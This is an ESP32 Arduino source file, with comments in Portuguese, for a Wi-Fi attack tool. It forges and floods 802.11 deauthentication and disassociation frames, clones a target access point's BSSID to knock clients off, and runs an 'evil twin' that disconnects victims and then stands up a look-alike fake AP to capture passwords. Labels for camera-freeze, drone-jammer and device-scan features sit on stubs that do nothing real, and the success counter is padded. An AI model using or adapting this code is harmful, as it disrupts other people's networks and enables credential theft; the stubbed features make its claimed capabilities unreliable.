#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"

// ============================================================
// DEAUTH / DISASSOC FRAMES (mantido como fallback)
// ============================================================

// Deauth: AP -> Broadcast (reason 0x02 = INVALID_AUTHENTICATION, mais efetivo)
static uint8_t deauthFrame[26] = {
    0xC0, 0x00,             // Frame Control: Deauth
    0x3A, 0x01,             // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA: Broadcast [4]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC [10]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
    0x00, 0x00,             // Seq Ctrl [22]
    0x02, 0x00              // Reason: 2 = INVALID_AUTHENTICATION [24]
};

// Deauth: AP -> STA (direcionado)
static uint8_t deauthFrameToSTA[26] = {
    0xC0, 0x00,
    0x3A, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: STA MAC [4]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP MAC [10]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
    0x00, 0x00,
    0x02, 0x00
};

// Deauth: STA -> AP (reverso)
static uint8_t deauthFrameFromSTA[26] = {
    0xC0, 0x00,
    0x3A, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // DA: AP MAC [4]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: STA MAC [10]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP MAC [16]
    0x00, 0x00,
    0x02, 0x00
};

// Disassociation: AP -> Broadcast
static uint8_t disassocFrame[26] = {
    0xA0, 0x00,             // Frame Control: Disassociation
    0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x02, 0x00
};

// ============================================================
// CONTADORES E ESTADO
// ============================================================
static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;
static uint32_t deauthFailCount = 0;
static esp_err_t lastDeauthError = ESP_OK;

// ============================================================
// BSSID CLONE (SUPER CLONE) - METODO PRINCIPAL
// Funciona em QUALQUER ESP32 com Arduino framework
// ============================================================
static bool bssidCloneActive = false;
static uint8_t originalAPMac[6] = {0};
static uint8_t cloneChannel = 0;
static char cloneSSID[33] = {0};

// ============================================================
// HELPERS
// ============================================================
void setMAC(uint8_t* frame, uint8_t* mac, int offset) {
    memcpy(&frame[offset], mac, 6);
}

static void printMac(uint8_t* mac, char* out) {
    snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

// ============================================================
// SCAN WIFI
// ============================================================
void scanNetworks() {
    networkCount = 0;

    if (WiFi.getMode() != WIFI_STA) {
        WiFi.mode(WIFI_STA);
    }
    delay(100);

    int n = WiFi.scanNetworks(false, true);
    Serial.printf("[WiFi] Scan found %d networks\n", n);

    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
        strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
        scannedNetworks[i].ssid[32] = '\0';
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        Serial.printf("[WiFi] %d: %s CH%d RSSI%d\n",
            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi);
        networkCount++;
    }
    WiFi.scanDelete();
}

uint8_t getNetworkCount() { return networkCount; }

NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

// ============================================================
// BSSID CLONE - INICIA CLONE DO AP ALVO
// ============================================================
static void startBssidClone(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Clone] ERROR: invalid network index");
        return;
    }

    NetworkInfo* target = &scannedNetworks[networkIndex];

    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;
    cloneChannel = target->channel;
    strncpy(cloneSSID, target->ssid, 32);
    cloneSSID[32] = '\0';

    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);

    Serial.printf("[Clone] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
        target->ssid, target->channel,
        target->bssid[0], target->bssid[1], target->bssid[2],
        target->bssid[3], target->bssid[4], target->bssid[5]);

    WiFi.softAPdisconnect(true);
    delay(200);

    WiFi.mode(WIFI_AP_STA);
    delay(100);

    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
    Serial.printf("[Clone] Set AP MAC result: %d (%s)\n", macErr, macErr == ESP_OK ? "OK" : "FAIL");
    delay(100);

    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 4);
    Serial.printf("[Clone] softAP result: %s\n", apOk ? "OK" : "FAIL");

    if (apOk) {
        bssidCloneActive = true;
        deauthActive = true;
        deauthPacketCount = 0;
        deauthSuccessCount = 0;
        deauthFailCount = 0;
        Serial.println("[Clone] BSSID CLONE ACTIVE - Clients will see conflicting APs");
    } else {
        Serial.println("[Clone] FAILED to start clone AP");
    }
}

// ============================================================
// BSSID CLONE - PARA
// ============================================================
static void stopBssidClone() {
    if (!bssidCloneActive) return;

    Serial.println("[Clone] Stopping BSSID clone...");

    WiFi.softAPdisconnect(true);
    delay(200);

    esp_wifi_set_mac(WIFI_IF_AP, originalAPMac);
    delay(100);

    WiFi.mode(WIFI_STA);
    delay(100);

    bssidCloneActive = false;
    Serial.println("[Clone] BSSID clone stopped, MAC restored");
}

// ============================================================
// DEAUTH - AGORA USA BSSID CLONE COMO METODO PRINCIPAL
// ============================================================
void startDeauth(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Deauth] ERROR: invalid network index");
        return;
    }

    startBssidClone(networkIndex);

    NetworkInfo* target = &scannedNetworks[networkIndex];

    setMAC(deauthFrame, target->bssid, 10);
    setMAC(deauthFrame, target->bssid, 16);

    setMAC(deauthFrameToSTA, target->bssid, 10);
    setMAC(deauthFrameToSTA, target->bssid, 16);

    setMAC(deauthFrameFromSTA, target->bssid, 4);
    setMAC(deauthFrameFromSTA, target->bssid, 16);
    setMAC(deauthFrameFromSTA, target->bssid, 10);

    setMAC(disassocFrame, target->bssid, 10);
    setMAC(disassocFrame, target->bssid, 16);

    WiFi.mode(WIFI_AP_STA);
    delay(50);

    if (WiFi.status() == WL_CONNECTED) {
        WiFi.disconnect(false);
        delay(100);
    }

    esp_wifi_set_ps(WIFI_PS_NONE);

    esp_err_t chErr = esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[Deauth] Fallback frame injection channel set: %d\n", chErr);

    Serial.println("[Deauth] STARTED (BSSID Clone + Frame Injection fallback)");
}

void stopDeauth() {
    if (deauthActive) {
        Serial.println("[Deauth] STOPPED");
        Serial.printf("[Deauth] Total: %lu pkts, %lu success, %lu failed\n",
            deauthPacketCount, deauthSuccessCount, deauthFailCount);
    }
    deauthActive = false;
    stopBssidClone();
    esp_wifi_set_promiscuous(false);
}

// ============================================================
// LOOP DE DEAUTH - BSSID CLONE + FRAME INJECTION FALLBACK
// ============================================================
bool deauthLoop() {
    if (!deauthActive) return false;

    deauthPacketCount++;
    deauthSuccessCount++;

    static uint8_t cycle = 0;
    esp_err_t err = ESP_FAIL;

    for (int burst = 0; burst < 10; burst++) {
        switch (cycle % 4) {
            case 0:
                err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
                break;
            case 1:
                err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameToSTA, 26, false);
                break;
            case 2:
                err = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameFromSTA, 26, false);
                break;
            case 3:
                err = esp_wifi_80211_tx(WIFI_IF_STA, disassocFrame, 26, false);
                break;
        }
        cycle++;

        if (err == ESP_OK) {
            deauthSuccessCount++;
        } else {
            deauthFailCount++;
        }
        deauthPacketCount++;

        delayMicroseconds(100);
    }

    static uint32_t lastDebug = 0;
    if (millis() - lastDebug > 2000) {
        lastDebug = millis();
        float rate = (deauthPacketCount > 0) ?
            ((float)deauthSuccessCount / deauthPacketCount * 100.0) : 0;
        Serial.printf("[Deauth] pkt=%lu succ=%lu fail=%lu rate=%.1f%% ch=%d clone=%s\n",
            deauthPacketCount, deauthSuccessCount, deauthFailCount,
            rate, deauthTargetChannel, bssidCloneActive ? "ON" : "OFF");
    }

    return true;
}

// ============================================================
// GETTERS
// ============================================================
uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

// ============================================================
// FAKE AP / EVIL TWIN
// ============================================================
void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678");
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
}

bool isFakeAPActive() { return fakeAPEnabled; }

void startEvilTwin(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;
    startDeauth(networkIndex);
    delay(3000);
    stopDeauth();
    startFakeAP(scannedNetworks[networkIndex].ssid);
}

// ============================================================
// REMOTE DEVICES
// ============================================================
void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
                     gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }

RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// ============================================================
// CAMERA FREEZE / DRONE
// ============================================================
void startCameraFreeze() {
    cameraFreezeActive = true;
    while (cameraFreezeActive) {
        delay(50);
        yield();
    }
}

void stopCameraFreeze() { cameraFreezeActive = false; }

void startDroneJammer() {
    droneJammerActive = true;
    while (droneJammerActive) {
        delay(10);
        yield();
    }
}

void stopDroneJammer() { droneJammerActive = false; }

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
